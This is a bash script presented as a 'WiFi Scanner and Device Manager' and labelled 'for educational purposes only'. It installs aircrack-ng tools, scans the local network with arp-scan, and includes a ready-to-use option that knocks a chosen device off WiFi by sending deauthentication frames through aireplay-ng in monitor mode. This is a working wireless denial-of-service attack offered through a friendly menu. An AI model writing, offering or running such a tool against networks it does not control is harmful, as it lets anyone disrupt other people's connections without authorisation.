#!/bin/bash

# WiFi Scanner and Device Manager
# For educational purposes only
# Created: $(date)

# Color codes for better readability
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;36m'
NC='\033[0m' # No Color

# Check if script is run as root
if [[ $EUID -ne 0 ]]; then
   echo -e "${RED}This script must be run as root (sudo)${NC}"
   exit 1
fi

# Check for required tools
check_requirements() {
    local tools=("arp-scan" "nmap" "aircrack-ng")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if ! command -v "$tool" &> /dev/null; then
            missing+=("$tool")
        fi
    done
    
    if [ ${#missing[@]} -ne 0 ]; then
        echo -e "${YELLOW}Missing required tools: ${missing[*]}${NC}"
        echo -e "${BLUE}Installing missing tools...${NC}"
        apt-get update
        for tool in "${missing[@]}"; do
            apt-get install -y "$tool"
        done
    fi
}

# Get current WiFi interface
get_wifi_interface() {
    # Try to find the active WiFi interface
    local interface=$(iwconfig 2>/dev/null | grep -o "^[a-zA-Z0-9]*" | head -n 1)
    
    if [ -z "$interface" ]; then
        echo -e "${RED}No wireless interface found.${NC}"
        exit 1
    fi
    
    echo "$interface"
}

# Scan for connected devices
scan_network() {
    local interface=$1
    local gateway=$(ip route | grep default | awk '{print $3}')
    local subnet=$(ip -o -f inet addr show | grep $interface | awk '{print $4}')
    
    echo -e "${BLUE}Interface: $interface${NC}"
    echo -e "${BLUE}Gateway: $gateway${NC}"
    echo -e "${BLUE}Subnet: $subnet${NC}"
    echo
    
    echo -e "${GREEN}Scanning network for connected devices...${NC}"
    echo -e "${YELLOW}This may take a few moments.${NC}"
    
    # Use arp-scan for quick discovery
    arp-scan --interface="$interface" --localnet
    
    # Alternative: use nmap for more detailed scan
    # nmap -sn "$subnet"
}

# Get MAC address of a device by IP
get_mac_by_ip() {
    local ip=$1
    local mac=$(arp -n | grep "$ip" | awk '{print $3}')
    echo "$mac"
}

# Disconnect a device from the network
disconnect_device() {
    local interface=$1
    local target_ip=$2
    local target_mac=$(get_mac_by_ip "$target_ip")
    local gateway=$(ip route | grep default | awk '{print $3}')
    local gateway_mac=$(get_mac_by_ip "$gateway")
    
    if [ -z "$target_mac" ]; then
        echo -e "${RED}Could not find MAC address for IP: $target_ip${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Attempting to disconnect device: $target_ip (MAC: $target_mac)${NC}"
    
    # Start monitor mode
    airmon-ng start "$interface"
    local mon_interface="${interface}mon"
    
    # Send deauthentication packets
    aireplay-ng --deauth=5 -a "$gateway_mac" -c "$target_mac" "$mon_interface"
    
    # Stop monitor mode
    airmon-ng stop "$mon_interface"
    
    echo -e "${GREEN}Deauthentication attempt completed.${NC}"
}

# Main menu
show_menu() {
    echo -e "${BLUE}===== WiFi Scanner and Device Manager =====${NC}"
    echo -e "${GREEN}1. Scan network for connected devices${NC}"
    echo -e "${YELLOW}2. Disconnect a specific device${NC}"
    echo -e "${RED}3. Exit${NC}"
    echo
    echo -n "Enter your choice [1-3]: "
}

# Main function
main() {
    local interface=$(get_wifi_interface)
    local choice
    
    while true; do
        show_menu
        read choice
        
        case $choice in
            1)
                scan_network "$interface"
                ;;
            2)
                echo -n "Enter the IP address of the device to disconnect: "
                read target_ip
                disconnect_device "$interface" "$target_ip"
                ;;
            3)
                echo -e "${GREEN}Exiting...${NC}"
                exit 0
                ;;
            *)
                echo -e "${RED}Invalid choice. Please try again.${NC}"
                ;;
        esac
        
        echo
        echo -n "Press Enter to continue..."
        read
        clear
    done
}

# Check requirements
check_requirements

# Start the program
main
